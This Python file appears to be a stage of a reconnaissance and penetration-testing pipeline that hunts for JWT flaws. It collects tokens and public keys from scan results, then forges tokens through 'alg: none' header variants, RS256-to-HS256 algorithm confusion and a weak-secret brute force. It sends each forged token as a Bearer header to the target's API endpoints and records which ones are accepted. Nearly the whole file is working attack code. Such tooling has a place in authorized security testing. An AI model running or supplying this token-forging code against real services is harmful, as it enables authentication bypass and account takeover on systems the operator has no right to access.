from __future__ import annotations

import base64
import json
import asyncio
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urljoin

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig


class JWTVulnerabilityStage(Stage):
    """
    JWT Security Vulnerability Stage.
    Tests for Algorithm Confusion, 'alg: none', and Weak Secret Brute-force.
    """
    name = "jwt_vuln"
    requires = ["js_intel", "http_probe", "auth_discovery"]

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_jwt_vuln", True))

    async def run_async(self, context: PipelineContext) -> bool:
        # 1. Collect JWTs from findings and traffic
        tokens = self._collect_tokens(context)
        if not tokens:
            context.logger.info("No JWT tokens found for testing")
            return True

        # 2. Collect candidate endpoints to test against
        endpoints = self._collect_test_endpoints(context)
        if not endpoints:
            context.logger.warning("No authenticated endpoints found to test JWTs against")
            # We might still want to test common endpoints like /api/me or /user
            endpoints = self._get_default_endpoints(context)

        client_config = HTTPClientConfig(
            max_concurrent=5,
            verify_ssl=getattr(context.runtime_config, "verify_tls", True),
            user_agent="Mozilla/5.0 recon-cli/2.0 JWT-Hunter"
        )

        async with AsyncHTTPClient(client_config, context=context) as client:
            for token_data in tokens:
                token = token_data["token"]
                source_url = token_data.get("url")
                
                context.logger.info(f"Testing JWT from {source_url or 'unknown source'}")
                
                # Test alg: none
                await self._test_alg_none(context, client, token, endpoints)
                
                # Test Algorithm Confusion (RS256 -> HS256)
                await self._test_alg_confusion(context, client, token, endpoints)
                
                # Test Weak Secrets
                await self._test_weak_secrets(context, client, token, endpoints)

        return True

    def _collect_tokens(self, context: PipelineContext) -> List[Dict[str, Any]]:
        """Gathers potential JWTs from findings and metadata."""
        tokens = []
        seen = set()

        # Check js_intel findings
        for entry in context.filter_results("js_secret"):
            evidence = entry.get("evidence", {})
            if evidence.get("type") == "jwt_token":
                val = evidence.get("value")
                if val and val not in seen:
                    context.logger.debug(f"Found JWT in js_secret: {val[:20]}...")
                    tokens.append({"token": val, "url": entry.get("url")})
                    seen.add(val)

        # Check all results for JWT-like strings in headers or bodies
        # (Heuristic: strings starting with eyJ... and having 2 dots)
        jwt_re = re.compile(r"eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]+")
        
        for entry in context.iter_results():
            # Look in evidence or description if they exist
            text = str(entry)
            for match in jwt_re.findall(text):
                if match not in seen:
                    context.logger.debug(f"Found JWT in results: {match[:20]}...")
                    tokens.append({"token": match, "url": entry.get("url")})
                    seen.add(match)

        context.logger.info(f"Collected {len(tokens)} unique JWTs for analysis")
        return tokens

    def _collect_test_endpoints(self, context: PipelineContext) -> List[str]:
        """Finds endpoints that likely require authentication."""
        endpoints = set()
        
        # 1. Look for auth_form actions
        for entry in context.filter_results("auth_form"):
            action = entry.get("action")
            if action: endpoints.add(action)

        # 2. Look for API endpoints from JS intel
        for entry in context.filter_results("url"):
            if entry.get("source") == "js-intel":
                url = entry.get("url")
                if url: endpoints.add(url)
                
        # 3. Look for endpoints where tokens were already used (if we had that tracking)
        
        # Filter and limit
        allowed = [u for u in endpoints if context.url_allowed(u)]
        return allowed[:20] # Limit to avoid DoS

    def _get_default_endpoints(self, context: PipelineContext) -> List[str]:
        # Try to derive from targets
        defaults = []
        for target in context.targets:
            if not target.startswith("http"):
                url = f"https://{target}"
            else:
                url = target
            defaults.append(urljoin(url, "/api/v1/me"))
            defaults.append(urljoin(url, "/api/user"))
            defaults.append(urljoin(url, "/graphql"))
        return defaults

    async def _test_alg_none(self, context: PipelineContext, client: AsyncHTTPClient, token: str, endpoints: List[str]):
        """Attempts to bypass auth using alg: none."""
        parts = token.split(".")
        if len(parts) < 2: return

        try:
            header = json.loads(self._b64_decode(parts[0]))
            if header.get("alg") == "none":
                return # Already none? strange but okay.
            
            # Create none-alg variants
            variants = []
            for none_val in ["none", "None", "NONE", "nOnE"]:
                new_header = header.copy()
                new_header["alg"] = none_val
                variants.append(f"{self._b64_encode(new_header)}.{parts[1]}.")
            
            for variant in variants:
                for url in endpoints:
                    if await self._verify_token(context, client, url, variant, "alg:none"):
                        # Finding emitted by _verify_token
                        return
        except Exception: pass

    async def _test_alg_confusion(self, context: PipelineContext, client: AsyncHTTPClient, token: str, endpoints: List[str]):
        """RS256 -> HS256 algorithm confusion using public keys found in the wild."""
        parts = token.split(".")
        if len(parts) < 3: return
        
        try:
            header = json.loads(self._b64_decode(parts[0]))
            if header.get("alg") != "RS256": return
            
            # Find public keys in results
            public_keys = self._collect_public_keys(context)
            if not public_keys: return
            
            for pub_key in public_keys:
                # Re-sign payload using HS256 with pub_key as secret
                # Note: This requires a crypto library or manual HMAC.
                # Since we don't have PyJWT, we'll use hmac + hashlib.
                try:
                    import hmac
                    import hashlib
                    
                    new_header = header.copy()
                    new_header["alg"] = "HS256"
                    unsigned_token = f"{self._b64_encode(new_header)}.{parts[1]}"
                    
                    signature = hmac.new(
                        pub_key.encode(),
                        unsigned_token.encode(),
                        hashlib.sha256
                    ).digest()
                    
                    signed_token = f"{unsigned_token}.{self._b64_encode(signature)}"
                    
                    for url in endpoints:
                        if await self._verify_token(context, client, url, signed_token, "alg:confusion"):
                            return
                except Exception: pass
        except Exception: pass

    async def _test_weak_secrets(self, context: PipelineContext, client: AsyncHTTPClient, token: str, endpoints: List[str]):
        """Brute-force HS256 secrets."""
        parts = token.split(".")
        if len(parts) < 3: return
        
        try:
            header = json.loads(self._b64_decode(parts[0]))
            if header.get("alg") != "HS256": return
            
            weak_secrets = ["secret", "password", "123456", "admin", "jwt", "key", "auth"]
            # Add target-specific hints
            for target in context.targets:
                weak_secrets.append(target.split(".")[0])
            
            import hmac
            import hashlib
            
            for secret in set(weak_secrets):
                unsigned_token = f"{parts[0]}.{parts[1]}"
                expected_signature = hmac.new(
                    secret.encode(),
                    unsigned_token.encode(),
                    hashlib.sha256
                ).digest()
                
                encoded_sig = self._b64_encode(expected_signature)
                if secret == "secret":
                    context.logger.debug(f"Testing 'secret': expected {encoded_sig}, got {parts[2]}")
                if encoded_sig == parts[2]:
                    context.logger.info(f"JWT Weak Secret Found: {secret}")
                    # Found the secret! Now we can forge any token.
                    context.emit_signal(
                        "jwt_weak_secret", "url", endpoints[0] if endpoints else "unknown",
                        confidence=0.9, source=self.name,
                        tags=["jwt", "weak-secret", "critical"],
                        evidence={"secret": secret, "token": token}
                    )
                    return
        except Exception as e:
            context.logger.error(f"Error in _test_weak_secrets: {e}")

    async def _verify_token(self, context: PipelineContext, client: AsyncHTTPClient, url: str, token: str, vuln_type: str) -> bool:
        """Checks if a forged token is accepted by the server."""
        try:
            # First, try WITHOUT token to get baseline
            # (In a real scenario, we'd compare with a valid token response)
            
            headers = {"Authorization": f"Bearer {token}"}
            resp = await client.get(url, headers=headers)
            
            # Heuristic: If it returns 200 and the content doesn't look like a login page
            if resp.status == 200:
                content = resp.body.lower()
                if "login" not in content and "unauthorized" not in content:
                    context.emit_signal(
                        "jwt_vulnerability", "url", url,
                        confidence=0.8, source=self.name,
                        tags=["jwt", vuln_type, "critical"],
                        evidence={"vuln": vuln_type, "token": token, "url": url}
                    )
                    return True
        except Exception: pass
        return False

    def _collect_public_keys(self, context: PipelineContext) -> List[str]:
        """Heuristically finds RSA public keys in JS or other files."""
        keys = []
        # Look for PEM-like public keys
        pub_key_re = re.compile(r"-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----", re.DOTALL)
        for entry in context.iter_results():
            text = str(entry)
            for match in pub_key_re.findall(text):
                keys.append(match)
        return keys

    def _b64_decode(self, data: str) -> str:
        missing_padding = len(data) % 4
        if missing_padding:
            data += "=" * (4 - missing_padding)
        return base64.urlsafe_b64decode(data).decode("utf-8", errors="ignore")

    def _b64_encode(self, data: Any) -> str:
        if isinstance(data, dict):
            data = json.dumps(data, separators=(",", ":")).encode("utf-8")
        elif isinstance(data, str):
            data = data.encode("utf-8")
        return base64.urlsafe_b64encode(data).decode("utf-8").replace("=", "")
